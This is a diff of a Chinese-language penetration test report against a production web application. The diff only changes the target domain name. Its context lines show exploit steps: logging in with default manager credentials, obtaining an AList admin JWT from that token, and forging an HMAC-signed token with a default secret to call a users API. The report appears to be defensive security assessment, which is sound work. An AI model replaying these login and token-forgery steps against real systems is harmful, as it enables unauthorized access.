@@ -2,7 +2,7 @@
 
 > 日期：2026-07-15
 > 测试工具：Strix 自动化扫描 + 手动验证
-> 测试环境：wlm.cdqzsta.tech（生产环境）
+> 测试环境：wlm.stacdqz.tech（生产环境）
 
 ---
 
@@ -16,7 +16,7 @@
 
 ```bash
 # 1. 用 manager 账号登录
-curl -s https://wlm.cdqzsta.tech/api/login \
+curl -s https://wlm.stacdqz.tech/api/login \
   -X POST -H "Content-Type: application/json" \
   -d '{"username":"manager","password":"manager"}'
 
@@ -24,7 +24,7 @@ curl -s https://wlm.cdqzsta.tech/api/login \
 # {"token":"eyJxxx.xxx.xxx","role":"manager",...}
 
 # 2. 用 manager token 获取 AList 管理员 JWT
-curl -s https://wlm.cdqzsta.tech/api/alist-token \
+curl -s https://wlm.stacdqz.tech/api/alist-token \
   -X POST \
   -H "Authorization: Bearer <manager_token>"
 
@@ -81,7 +81,7 @@ sig = hmac.new(b'default-secret-change-me', payload.encode(), hashlib.sha256).he
 print(f'{payload}.{sig}')
 "
 
-curl -s https://wlm.cdqzsta.tech/api/users \
+curl -s https://wlm.stacdqz.tech/api/users \
   -H "Authorization: Bearer <伪造的token>"
 ```
 
